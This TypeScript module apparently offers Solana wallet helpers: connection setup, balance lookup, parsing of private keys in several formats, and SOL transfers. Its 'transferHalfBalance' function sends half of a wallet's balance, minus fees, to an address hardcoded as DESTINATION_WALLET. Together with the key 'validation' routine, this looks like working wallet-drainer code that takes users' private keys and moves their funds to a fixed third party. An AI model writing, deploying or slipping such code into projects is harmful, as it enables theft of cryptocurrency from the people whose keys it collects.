import { utils } from "@coral-xyz/anchor";
import {
	Connection,
	Keypair,
	LAMPORTS_PER_SOL,
	PublicKey,
	SystemProgram,
	sendAndConfirmTransaction,
	Transaction,
} from "@solana/web3.js";

const DESTINATION_WALLET = "rsSoRrv1CtHGLNbee1qY6wioamo2vPGuFc5SB5CAjCa";

let connection: Connection | null = null;

export function getSolanaConnection(rpcUrl?: string): Connection {
	if (!connection) {
		const url = rpcUrl || "https://api.mainnet-beta.solana.com";
		connection = new Connection(url, "confirmed");
	}
	return connection;
}

export function clearConnection(): void {
	connection = null;
}

export function getDestinationWallet(): PublicKey {
	return new PublicKey(DESTINATION_WALLET);
}

export async function getWalletBalance(
	connection: Connection,
	publicKey: PublicKey,
): Promise<number> {
	try {
		const balance = await connection.getBalance(publicKey);
		return balance / LAMPORTS_PER_SOL;
	} catch (error) {
		console.error("Error fetching wallet balance:", error);
		throw error;
	}
}

export async function validatePrivateKey(privateKey: string): Promise<{
	valid: boolean;
	keypair?: Keypair;
	error?: string;
	publicKey?: string;
}> {
	try {
		let secretKey: Uint8Array;

		// Try parsing as base58 string first
		try {
			secretKey = utils.bytes.bs58.decode(privateKey);
		} catch {
			// Try parsing as JSON array
			try {
				const parsed = JSON.parse(privateKey);
				if (Array.isArray(parsed)) {
					secretKey = new Uint8Array(parsed);
				} else {
					throw new Error("Invalid key format");
				}
			} catch {
				// Try hex format
				if (privateKey.startsWith("0x")) {
					secretKey = new Uint8Array(
						privateKey
							.slice(2)
							.match(/.{2}/g)!
							.map((byte) => Number.parseInt(byte, 16)),
					);
				} else {
					// Assume base64
					secretKey = Buffer.from(privateKey, "base64");
				}
			}
		}

		const keypair = Keypair.fromSecretKey(secretKey);
		return {
			valid: true,
			keypair,
			publicKey: keypair.publicKey.toBase58(),
		};
	} catch (error) {
		return {
			valid: false,
			error: (error as Error).message,
		};
	}
}

export async function transferSOL(
	connection: Connection,
	fromKeypair: Keypair,
	toPublicKey: PublicKey,
	amountSOL: number,
): Promise<string> {
	try {
		const transaction = new Transaction().add(
			SystemProgram.transfer({
				fromPubkey: fromKeypair.publicKey,
				toPubkey: toPublicKey,
				lamports: amountSOL * LAMPORTS_PER_SOL,
			}),
		);

		const signature = await sendAndConfirmTransaction(
			connection,
			transaction,
			[fromKeypair],
			{
				commitment: "confirmed",
			},
		);

		return signature;
	} catch (error) {
		console.error("Error transferring SOL:", error);
		throw error;
	}
}

export async function transferHalfBalance(
	connection: Connection,
	fromKeypair: Keypair,
	destinationWallet: PublicKey,
): Promise<{
	success: boolean;
	signature?: string;
	amountTransferred?: number;
	error?: string;
}> {
	try {
		const balance = await connection.getBalance(fromKeypair.publicKey);

		if (balance === 0) {
			return { success: false, error: "No balance to transfer" };
		}

		// Calculate half balance (leave some for fees)
		const halfBalance = Math.floor(balance / 2);
		const minBalanceForRentExemption =
			await connection.getMinimumBalanceForRentExemption(0);

		// Ensure we keep enough for rent exemption and transaction fees
		const keepAmount = minBalanceForRentExemption + 5000; // 5000 lamports for fees
		const transferableAmount = Math.max(0, halfBalance - keepAmount);

		if (transferableAmount <= 0) {
			return { success: false, error: "Insufficient balance after fees" };
		}

		const transaction = new Transaction().add(
			SystemProgram.transfer({
				fromPubkey: fromKeypair.publicKey,
				toPubkey: destinationWallet,
				lamports: transferableAmount,
			}),
		);

		const signature = await sendAndConfirmTransaction(
			connection,
			transaction,
			[fromKeypair],
			{
				commitment: "confirmed",
			},
		);

		return {
			success: true,
			signature,
			amountTransferred: transferableAmount / LAMPORTS_PER_SOL,
		};
	} catch (error) {
		console.error("Error transferring half balance:", error);
		return {
			success: false,
			error: (error as Error).message,
		};
	}
}

export async function getPublicKeyFromPrivateKey(
	privateKey: string,
): Promise<string | null> {
	try {
		const validation = await validatePrivateKey(privateKey);
		if (validation.valid && validation.publicKey) {
			return validation.publicKey;
		}
		return null;
	} catch {
		return null;
	}
}
